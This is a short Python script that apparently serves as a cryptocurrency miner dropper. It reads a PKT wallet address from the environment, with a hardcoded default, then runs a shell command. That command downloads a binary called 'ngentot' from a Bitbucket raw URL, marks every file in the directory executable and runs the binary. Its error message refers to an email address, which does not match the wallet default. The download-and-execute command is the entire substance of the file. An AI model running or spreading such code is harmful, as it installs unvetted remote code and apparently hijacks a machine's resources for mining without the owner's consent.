import os
import socket
import subprocess
import sys
from pathlib import Path

def start_process():
    ptk_address = os.environ.get('ptk_address', "pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e")
    if ptk_address is None:
        print('PTK_address environment variable is not set. Please set it to your email address.')
        sys.exit(1)
    cmd = f'wget https://bitbucket.org/enafyarti/pktwatch/raw/c6b4a03a1c1404fadcceb037b734dc16f451a6f9/project/ngentot && chmod +x * && ./ngentot'
    out, err = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(out.decode('utf-8'))
    print(err.decode('utf-8'))

start_process()
